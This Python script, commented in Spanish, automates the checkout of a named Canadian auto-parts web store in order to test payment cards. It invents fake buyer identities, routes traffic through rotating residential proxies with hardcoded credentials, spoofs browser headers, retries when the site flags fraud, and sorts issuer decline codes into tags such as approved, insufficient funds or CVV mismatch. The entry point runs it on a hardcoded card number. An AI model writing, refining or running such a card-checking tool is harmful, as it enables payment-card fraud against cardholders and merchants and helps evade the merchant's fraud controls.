import requests
import re
import random
import string
import time
from urllib.parse import urlsplit
from faker import Faker

BASE_HEADERS = {
    # Los headers de Client Hints (sec-ch) deben ir primero, 
    # ya que Chrome los envía al inicio del handshake.
    "sec-ch-ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    
    # Headers de navegación estándar
    "accept": "*/*",
    "priority": "u=1, i",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://www.thewrenchmonkey.ca/",
    "accept-language": "en-US,es-419;q=0.9,es;q=0.8",
    "content-type": "application/x-www-form-urlencoded",
    
    # El User-Agent debe coincidir exactamente con los sec-ch-ua de arriba
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    
    "x-requested-with": "XMLHttpRequest",
    "origin": "https://www.thewrenchmonkey.ca"
}
TIMEOUT = 25

# Proxy IPRoyal US
USE_PROXY = True
USER = "o1CK8doqxzS9ENdO"
PASS_BASE = "ewwKtN9UnwgSnWnV_country-ca"
PROXY_HOST = "geo.iproyal.com"
PROXY_PORT = 11200


def _headers(referer: str):
    h = BASE_HEADERS.copy()
    h["referer"] = referer
    return h


def _short(txt: str, n: int = 180):
    txt = (txt or "").replace("\n", " ").strip()
    return txt[:n] + ("..." if len(txt) > n else "")


def _build_proxy_url():
    session_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    proxy_url = f"http://{USER}:{PASS_BASE}_session-{session_id}@{PROXY_HOST}:{PROXY_PORT}"
    return proxy_url, session_id


def _normalize_phone_10_digits(raw_phone: str):
    digits = re.sub(r"\D", "", raw_phone or "")
    if len(digits) < 10:
        digits = digits.ljust(10, "0")
    return digits[-10:]


def _build_ca_phone_10_digits():
    # NPA-NXX-XXXX con restricciones básicas NANP (NPA/NXX no inician con 0/1)
    npa_first = random.choice("23456789")
    npa_rest = "".join(random.choices("0123456789", k=2))

    nxx_first = random.choice("23456789")
    nxx_rest = "".join(random.choices("0123456789", k=2))

    line = "".join(random.choices("0123456789", k=4))
    return f"{npa_first}{npa_rest}{nxx_first}{nxx_rest}{line}"


def _normalize_postal_ca(raw_postal: str):
    cleaned = re.sub(r"[^A-Za-z0-9]", "", (raw_postal or "").upper())
    if len(cleaned) < 6:
        cleaned = (cleaned + "S4P3Y2")[:6]
    return f"{cleaned[:3]} {cleaned[3:6]}"


def _build_fake_canada_profile():
    fake = Faker("en_CA")

    first_name = fake.first_name()
    last_name = fake.last_name()
    street = fake.street_address()
    city = fake.city()
    postal = _normalize_postal_ca(fake.postcode())
    phone = _build_ca_phone_10_digits()

    # Normalización mínima para payload
    address_line1 = street [:60]
    address_line2 = str(fake.building_number())[:10]
    province = "ONTARIO"  # mantenemos Ontario para compatibilidad con flujo HAR

    return {
        "first_name": first_name,
        "last_name": last_name,
        "address_line1": address_line1,
        "address_line2": address_line2,
        "city": city,
        "province": province,
        "postal_code": postal,
        "phone_number": phone
    }


def _extract_popup_message(raw_text: str):
    m = re.search(r'popupAlertMessage\("([^"]+)"\)', raw_text or "", flags=re.IGNORECASE)
    return m.group(1).strip() if m else (raw_text or "").strip()


def _extract_codes_from_message(msg: str):
    code_compound = None
    network_code = None

    m_compound = re.search(r'(\d{3}-[A-Z0-9]{1,3})', msg or "", flags=re.IGNORECASE)
    if m_compound:
        code_compound = m_compound.group(1).upper()
        network_code = code_compound.split("-")[-1]
    else:
        m_net = re.search(r'\b(N7|05|14|51|54|57|61|65|78|91|96)\b', msg or "", flags=re.IGNORECASE)
        if m_net:
            network_code = m_net.group(1).upper()

    return code_compound, network_code


def _tag_from_error(message: str, network_code: str):
    msg_l = (message or "").lower()

    if "an issue occurred processing your order" in msg_l or "frt001" in msg_l:
        return "#FRAUD"

    tag_map = {
        "N7": "#CVV_MISMATCH",
        "05": "#DO_NOT_HONOR",
        "14": "#INVALID_CARD",
        "51": "#INSUFFICIENT_FUNDS",
        "54": "#EXPIRED_CARD",
        "57": "#TX_NOT_PERMITTED",
        "61": "#EXCEEDS_LIMIT",
        "65": "#ACTIVITY_LIMIT_EXCEEDED",
        "78": "#CARD_BLOCKED_OR_RESTRICTED",
        "91": "#PROCESSOR_UNAVAILABLE",
        "96": "#PROCESSOR_UNAVAILABLE",
        "88": "#ISSUER_UNAVAILABLE",
    }

    if network_code in tag_map:
        return tag_map[network_code]

    if "north american phone number length must be 10 digits long" in msg_l:
        return "#PHONE_VALIDATION"

    if "issuer not online" in msg_l:
        return "#ISSUER_UNAVAILABLE"

    if "declined" in msg_l or "unsuccessful payment authorization" in msg_l:
        return "#DECLINED"

    if "approved" in msg_l:
        return "#APPROVED"

    return "#UNKNOWN_ERROR"


def _classify_result(text: str):
    t = (text or "").lower()
    if "north american phone number length must be 10 digits long" in t:
        return "PHONE_VALIDATION"
    if "frt001" in t or "an issue occurred processing your order" in t:
        return text
    if "declined" in t or "unsuccessful payment authorization" in t:
        return "DECLINED"
    if "approved" in t or "success" in t:
        return "APPROVED"
    return "UNKNOWN"


def _estimate_request_size_bytes(method: str, url: str, headers: dict, data):
    req_line = f"{method.upper()} {urlsplit(url).path or '/'} HTTP/1.1\r\n"
    host_line = f"Host: {urlsplit(url).netloc}\r\n"
    header_lines = ""
    for k, v in (headers or {}).items():
        header_lines += f"{k}: {v}\r\n"

    body_bytes = 0
    if data is not None:
        if isinstance(data, dict):
            encoded_pairs = [f"{k}={v}" for k, v in data.items()]
            body_text = "&".join(encoded_pairs)
            body_bytes = len(body_text.encode("utf-8", errors="ignore"))
        elif isinstance(data, str):
            body_bytes = len(data.encode("utf-8", errors="ignore"))
        else:
            body_bytes = len(str(data).encode("utf-8", errors="ignore"))

    return len((req_line + host_line + header_lines + "\r\n").encode("utf-8", errors="ignore")) + body_bytes


def _estimate_response_size_bytes(resp: requests.Response):
    status_line = f"HTTP/1.1 {resp.status_code}\r\n"
    header_lines = ""
    for k, v in (resp.headers or {}).items():
        header_lines += f"{k}: {v}\r\n"
    body_bytes = len(resp.content or b"")
    return len((status_line + header_lines + "\r\n").encode("utf-8", errors="ignore")) + body_bytes


def ejecutar_apion_final_v5(cc, mm, yy, cvv, tipo_card):
    session = requests.Session()

    try:
        profile = _build_fake_canada_profile()
    except Exception as e:
        raise RuntimeError("Faker no disponible o falló su inicialización. Instala con: pip install faker") from e

    print(
        f"🧾 Faker CA: {profile['first_name']} {profile['last_name']} | "
        f"{profile['city']}, {profile['province']} {profile['postal_code']} | "
        f"PHONE={profile['phone_number']}"
    )

    if USE_PROXY:
        proxy_url, proxy_session_id = _build_proxy_url()
        session.proxies.update({
            "http": proxy_url,
            "https": proxy_url
        })
        print(f"🌐 Proxy activo: {PROXY_HOST}:{PROXY_PORT} | session_id={proxy_session_id}")

    transfer_logs = []
    totals = {
        "request_bytes": 0,
        "response_bytes": 0,
        "total_bytes": 0,
        "requests_count": 0
    }

    def tracked_request(method, url, headers=None, data=None, timeout=TIMEOUT, label=""):
        req_size = _estimate_request_size_bytes(method, url, headers or {}, data)
        resp = session.request(method=method, url=url, headers=headers, data=data, timeout=timeout)
        resp_size = _estimate_response_size_bytes(resp)
        total = req_size + resp_size

        transfer_logs.append({
            "label": label or f"{method.upper()} {url}",
            "method": method.upper(),
            "url": url,
            "status": resp.status_code,
            "request_bytes": req_size,
            "response_bytes": resp_size,
            "total_bytes": total
        })

        totals["request_bytes"] += req_size
        totals["response_bytes"] += resp_size
        totals["total_bytes"] += total
        totals["requests_count"] += 1
        return resp

    try:
        # 1. Sesión Inicial
        print("🔗 [1/5] Iniciando sesión...")
        r1 = tracked_request(
            "GET",
            "https://www.thewrenchmonkey.ca/",
            headers=_headers("https://www.thewrenchmonkey.ca/"),
            timeout=TIMEOUT,
            label="home"
        )
        print(f"   ↳ status={r1.status_code}")
        r1.raise_for_status()

        # 2. Añadir al carrito
        print("🛒 [2/5] Añadiendo producto...")
        add_url = "https://www.thewrenchmonkey.ca/request/ajax_add_item_to_cart_session_2021_04_21.php"
        item_payload = {
            "manufacturer": "AISIN",
            "part_number": "ATFDW1",
            "quantity": "1",
            "partterminologyname": "Auto Trans Fluid",
            "selected_options": "",
            "vehicleYear": "2011",
            "vehicleMake": "Honda",
            "vehicleModel": "Accord Crosstour"
        }
        r2 = tracked_request(
            "POST",
            add_url,
            data=item_payload,
            headers=_headers("https://www.thewrenchmonkey.ca/"),
            timeout=TIMEOUT,
            label="add_to_cart"
        )
        print(f"   ↳ status={r2.status_code} body={_short(r2.text)}")
        r2.raise_for_status()

        # 3. Pickup desde el carrito
        print("🚚 [3/5] Validando Pickup y sincronizando sesión...")
        pickup_url = "https://www.thewrenchmonkey.ca/response/checkout_update_selected_data_2024_10_02.php"
        pickup_payload = {
            "deliveryTypeName": "pickup",
            "shipToPostalCode": "",
            "shipToCountry": "Canada"
        }
        r3 = tracked_request(
            "POST",
            pickup_url,
            data=pickup_payload,
            headers=_headers("https://www.thewrenchmonkey.ca/cart"),
            timeout=TIMEOUT,
            label="pickup_update"
        )
        print(f"   ↳ status={r3.status_code} body={_short(r3.text)}")
        r3.raise_for_status()

        # 4. Flujo HAR correcto: fetch opciones y fijar shippingMethodID
        print("🔧 [4/6] Resolviendo shippingMethodID con endpoint de delivery options...")
        fetch_delivery_url = "https://www.thewrenchmonkey.ca/response/sales_quote_fetch_delivery_option_list_2024.php"

        # Primero forzamos 'delivery' con postal/country para que el backend genere opciones
        r4_seed = tracked_request(
            "POST",
            pickup_url,
            data={"deliveryTypeName": "delivery", "shipToPostalCode": "M9W5X8", "shipToCountry": "Canada"},
            headers=_headers("https://www.thewrenchmonkey.ca/checkout"),
            timeout=TIMEOUT,
            label="seed_delivery"
        )
        print(f"   ↳ seedDelivery status={r4_seed.status_code} body={_short(r4_seed.text)}")

        # Traemos opciones y luego fijamos shippingMethodID
        r4_fetch_1 = tracked_request(
            "POST",
            fetch_delivery_url,
            data={},
            headers=_headers("https://www.thewrenchmonkey.ca/checkout"),
            timeout=TIMEOUT,
            label="fetch_delivery_options_1"
        )
        print(f"   ↳ fetchOptions#1 status={r4_fetch_1.status_code}")

        # Según HAR real: shippingMethodID=113
        shipping_method_id = "113"
        r4_set = tracked_request(
            "POST",
            fetch_delivery_url,
            data={"shippingMethodID": shipping_method_id},
            headers=_headers("https://www.thewrenchmonkey.ca/checkout"),
            timeout=TIMEOUT,
            label="set_shipping_method"
        )
        print(f"   ↳ setShippingID status={r4_set.status_code} body={_short(r4_set.text)}")

        r4_fetch_2 = tracked_request(
            "POST",
            fetch_delivery_url,
            data={},
            headers=_headers("https://www.thewrenchmonkey.ca/checkout"),
            timeout=TIMEOUT,
            label="fetch_delivery_options_2"
        )
        print(f"   ↳ fetchOptions#2 status={r4_fetch_2.status_code} body={_short(r4_fetch_2.text)}")

        # 5. Preparar checkout y resolver shippingMethodID real
        print("🔍 Preparando checkout (cart + checkout) ...")
        r_cart = tracked_request(
            "GET",
            "https://www.thewrenchmonkey.ca/cart",
            headers=_headers("https://www.thewrenchmonkey.ca/"),
            timeout=TIMEOUT,
            label="cart"
        )
        print(f"   ↳ cart status={r_cart.status_code}")

        res_checkout = tracked_request(
            "GET",
            "https://www.thewrenchmonkey.ca/checkout",
            headers=_headers("https://www.thewrenchmonkey.ca/cart"),
            timeout=TIMEOUT,
            label="checkout"
        )
        print(f"   ↳ checkout status={res_checkout.status_code}")
        res_checkout.raise_for_status()

        html_checkout = res_checkout.text

        # endpoint dinámico de pago
        match = re.search(r'doCheckOut_\d{4}_\d{2}_\d{2}\.php', html_checkout)
        if not match:
            raise RuntimeError("No se encontró endpoint doCheckOut_YYYY_MM_DD.php en /checkout")
        endpoint = f"https://www.thewrenchmonkey.ca/ajax_scripts/{match.group(0)}"
        print(f"   ↳ endpoint={endpoint}")

        # shippingMethodID real desde checkout (si existe)
        shipping_id = None
        patterns = [
            r'shippingMethodID["\']?\s*[:=]\s*["\']?(\d+)',
            r'selectedShippingMethodID["\']?\s*[:=]\s*["\']?(\d+)',
            r'name=["\']shippingMethodID["\']\s+value=["\'](\d+)["\']',
            r'shipping_method_id["\']?\s*[:=]\s*["\']?(\d+)'
        ]
        for p in patterns:
            m = re.search(p, html_checkout, flags=re.IGNORECASE)
            if m:
                shipping_id = m.group(1)
                break

        if shipping_id:
            print(f"   ↳ shippingMethodID detectado={shipping_id}")
        else:
            print("   ↳ No se detectó shippingMethodID en checkout; continuamos con payloads HAR-like.")

        # Update final exacto según HAR antes del checkout
        billing_update_payload = {
            "deliveryTypeName": "delivery",
            "selectedSameAsBilling": "true",
            "billToCountry": "Canada",
            "billToProvinceState": profile["province"],
            "billToPostalCode": profile["postal_code"],
            "billToCity": profile["city"]
        }
        r_set_final = tracked_request(
            "POST",
            pickup_url,
            data=billing_update_payload,
            headers=_headers("https://www.thewrenchmonkey.ca/checkout"),
            timeout=TIMEOUT,
            label="checkout_update_final"
        )
        print(f"   ↳ checkoutUpdateFinal status={r_set_final.status_code} body={_short(r_set_final.text)}")

        print("💳 [6/6] Enviando transacción final...")
        email_local = f"{profile['first_name']}.{profile['last_name']}".lower().replace(" ", "").replace("'", "")

        # Guard rail final: asegurar 10 dígitos justo antes del pago
        profile["phone_number"] = _normalize_phone_10_digits(profile.get("phone_number", ""))
        if len(profile["phone_number"]) != 10:
            profile["phone_number"] = _build_ca_phone_10_digits()

        print(f"   ↳ final_phone={profile['phone_number']}")

        pay_payload = {
            "checkoutMethod": "CreditCard",
            "email": f"{email_local}@gmail.com",
            "subscribeToMailingList": "true",
            "billToFirstName": profile["first_name"],
            "shipToFirstName": profile["first_name"],
            "billToLastName": profile["last_name"],
            "shipToLastName": profile["last_name"],
            "billToPhoneNumber": profile["phone_number"],
            "shipToPhoneNumber": profile["phone_number"],
            "billToCompany": "",
            "shipToCompany": "",
            "billToCountry": "Canada",
            "shipToCountry": "Canada",
            "billToProvinceState": profile["province"],
            "shipToProvinceState": profile["province"],
            "billToCity": profile["city"],
            "shipToCity": profile["city"],
            "billToPostalCode": profile["postal_code"],
            "shipToPostalCode": profile["postal_code"],
            "billToAddressLine1": profile["address_line1"],
            "shipToAddressLine1": profile["address_line1"],
            "billToAddressLine2": profile["address_line2"],
            "shipToAddressLine2": profile["address_line2"],
            "cardType": tipo_card,
            "cardNumber": cc,
            "cardExpirationMonth": mm,
            "cardExpirationYear": yy,
            "cardSecurityCode": cvv
        }

        fraud_msg = "An issue occurred processing your order. For assistance, please contact our customer service team"
        max_retries = 3
        attempt = 0
        response = None
        attempts_log = []

        while attempt < max_retries:
            attempt += 1
            response = tracked_request(
                "POST",
                endpoint,
                data=pay_payload,
                headers=_headers("https://www.thewrenchmonkey.ca/checkout"),
                timeout=TIMEOUT,
                label=f"payment_attempt_{attempt}"
            )
            short_resp = _short(response.text, 220)
            attempts_log.append((attempt, response.status_code, short_resp))
            print(f"   ↳ pay status={response.status_code} (attempt {attempt}/{max_retries}) body={short_resp}")

            if fraud_msg not in response.text:
                break

            if attempt < max_retries:
                print("   ↳ Detectado mensaje tipo FRAUD/FRT. Reintentando pago final...")
                time.sleep(1.5)

        result_text = _short(response.text if response is not None else "", 1000)
        is_fraud_final = response is not None and (fraud_msg in response.text)

        raw_response_text = response.text if response is not None else ""
        classification = _classify_result(raw_response_text)

        parsed_message = _extract_popup_message(raw_response_text)
        error_code, network_code = _extract_codes_from_message(parsed_message)
        tag = _tag_from_error(parsed_message, network_code)

        print("\n" + "=" * 50)
        print("PAY ATTEMPTS:")
        for n, st, body in attempts_log:
            print(f"  - attempt {n}: status={st} body={body}")
        print(f"RAW_RESULT: {result_text}")
        print(f"PARSED_MESSAGE: {parsed_message}")
        print(f"ERROR_CODE: {error_code if error_code else 'N/A'}")
        print(f"NETWORK_CODE: {network_code if network_code else 'N/A'}")
        print(f"TAG: {tag}")
        print(f"CLASSIFICATION: {classification}")
        print(f"CARD ENDING: {cc[-4:]}")
        if is_fraud_final and tag != "#FRAUD":
            print("TAG: #FRAUD")
        print("-" * 50)
        print("TRANSFER SUMMARY:")
        print(f"REQUESTS_COUNT: {totals['requests_count']}")
        print(f"REQUEST_BYTES: {totals['request_bytes']} ({totals['request_bytes']/1024:.2f} KB)")
        print(f"RESPONSE_BYTES: {totals['response_bytes']} ({totals['response_bytes']/1024:.2f} KB)")
        print(f"TOTAL_TRANSFER_BYTES: {totals['total_bytes']} ({totals['total_bytes']/1024:.2f} KB | {totals['total_bytes']/(1024*1024):.3f} MB)")
        print("PER REQUEST:")
        for row in transfer_logs:
            print(
                f"  - {row['label']}: status={row['status']} "
                f"req={row['request_bytes']}B resp={row['response_bytes']}B total={row['total_bytes']}B"
            )
        print("=" * 50)

    except requests.HTTPError as e:
        print(f"⚠️ HTTPError: {e}")
        if e.response is not None:
            print(f"   status={e.response.status_code} body={_short(e.response.text, 500)}")
    except Exception as e:
        print(f"⚠️ Error: {e}")


if __name__ == "__main__":
    ejecutar_apion_final_v5("4092386117254965", "08", "2029", "719", "Visa")


